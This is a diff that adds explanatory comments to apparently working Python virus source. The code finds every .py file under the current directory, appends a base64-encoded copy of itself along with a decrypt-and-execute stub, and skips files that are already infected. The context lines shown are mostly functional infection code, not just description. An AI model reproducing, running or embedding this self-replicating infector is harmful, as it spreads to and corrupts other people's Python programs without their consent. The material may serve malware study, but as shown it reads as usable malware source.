@@ -3,6 +3,7 @@
 ### E & D START ###
 import glob,sys,re,base64,json,COVID19Py
 def decrypt():
+    # check the file is actual virus file or infected file.
     isInfectedFile = True
     with open(sys.argv[0],"r") as fh:
         lines = fh.readlines()
@@ -10,7 +11,7 @@ def decrypt():
         for line in lines:
             if(line.startswith("### -_- VIRUS -_- ###")):
                 isInfectedFile = False
-    
+    # if it is infected file get encryped code then decrypt and execute it.
     if(isInfectedFile):
         with open(sys.argv[0],"r") as fh:
             lines = fh.readlines()
@@ -49,7 +50,7 @@ def getED(): # get encrypt and decrypt part
             append = False
     return edCode
 
-def getVirusCode():
+def getVirusCode(): # get actual virus code withou encrypt decrypt part
     virusCode = []
     fileHandler = open(sys.argv[0],"r")
     lines = fileHandler.readlines()
@@ -64,7 +65,7 @@ def getVirusCode():
             append = True
     return virusCode
 
-def find_victims():
+def find_victims(): # find potential victims
     return glob.glob("**/*.py",recursive=True)
 
 def infectVirus():
@@ -77,7 +78,7 @@ def infectVirus():
             programCode = fh.read()
 
         infected = False
-        for codeLine in codeLines:
+        for codeLine in codeLines: # check the potantial victim is already infected or not
             if(codeLine.startswith("### E & D START ###")):
                 infected = True
                 break
@@ -86,15 +87,15 @@ def infectVirus():
         fileHandler = open(sys.argv[0],"r")
         virusLines = fileHandler.readlines()
 
-        for virusline in virusLines:
+        for virusline in virusLines: # check executed code is actual virus or one of the infected files
             if(virusline.startswith("### -_- VIRUS -_- ###")):
                 isActualVirus = True
 
         if not infected and isActualVirus:
             newCode = []
-            newCode.extend(programCode + "\n")
+            newCode.extend(programCode + "\n") # add default program code
 
-            newCode.extend(getED())
+            newCode.extend(getED()) # add encrypt decrypt part
 
             virusCode = str()
             lines = getVirusCode()
@@ -102,7 +103,7 @@ def infectVirus():
                 virusCode = virusCode + line
             
             newCode.extend("### -_- PAYLOAD -_- ###\n")
-            
+            # add encrypted virus code
             encryptedVirusCode = base64.b64encode(virusCode.encode("utf-8"))
 
             newCode.extend("#" + encryptedVirusCode.decode("utf-8"))
@@ -113,9 +114,9 @@ def infectVirus():
         
         elif not infected and not isActualVirus:
             newCode = []
-            newCode.extend(programCode + "\n")
+            newCode.extend(programCode + "\n") # add default program code
 
-            newCode.extend(getED())
+            newCode.extend(getED())  # add encrypt decrypt part
 
             virusCode = str()
             lines = getVirusCode()
@@ -125,7 +126,7 @@ def infectVirus():
                     addFlag = True
                 if(addFlag):
                     virusCode = virusCode + line
-            
+            # add already encrypted part
             newCode.extend(virusCode)
             
             fileHandler = open(victim,"w")
